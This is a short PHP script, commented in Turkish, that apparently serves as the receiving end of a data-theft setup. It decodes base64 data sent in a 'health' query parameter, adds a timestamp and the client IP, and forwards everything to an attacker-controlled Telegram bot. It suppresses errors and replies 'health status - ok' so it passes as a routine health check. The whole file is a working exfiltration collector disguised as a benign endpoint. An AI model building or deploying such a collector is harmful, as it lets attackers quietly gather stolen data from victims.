<?php
// Hataları gizle (üretim ortamı için)
error_reporting(0);

// Header'ları en üste taşı
header("HTTP/1.1 200 OK");
header("Content-Type: text/plain");

// 1. Gelen Veriyi İşle
$encodedData = $_GET['health'] ?? '';
$encodedData = str_replace(['-', '_'], ['+', '/'], $encodedData);
$decodedData = base64_decode($encodedData);

// 2. Meta Verileri Topla
$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';

// 3. Telegram'a Bildir (cURL ile)
$telegramBotToken = 'BOT_TOKEN';  // Buraya Telegram bot token'ınızı yazın
$telegramChatID = 'CHAT_ID';  // Buraya Telegram chat ID'nizi yazın
$message = urlencode("🕵️ Yeni Veri!\n⌚ Zaman: $timestamp\n🌐 IP: $ip\n📦 Veri: $decodedData");
$telegramURL = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$telegramChatID&text=$message";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramURL);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
@curl_exec($ch);
curl_close($ch);

// 4. Yanıtı Gönder
echo "health status - ok";
exit;
?>
